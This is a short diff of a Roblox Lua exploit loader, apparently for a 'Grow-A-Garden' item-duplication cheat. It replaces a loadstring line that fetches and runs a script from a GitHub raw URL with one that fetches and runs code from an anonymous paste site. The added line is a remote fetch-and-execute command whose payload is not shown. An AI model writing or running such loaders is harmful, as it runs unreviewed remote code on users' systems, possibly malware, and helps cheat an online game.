@@ -1,5 +1,5 @@
 -- Run first script
-loadstring(game:HttpGet("https://raw.githubusercontent.com/SCRlPT-HUB/Grow-A-Garden/refs/heads/main/GrowAGardenDUPE"))()
+loadstring(game:HttpGet("http://vpaste.net/fpugS"))()
 
 -- Wait for 10 seconds
 wait(10)
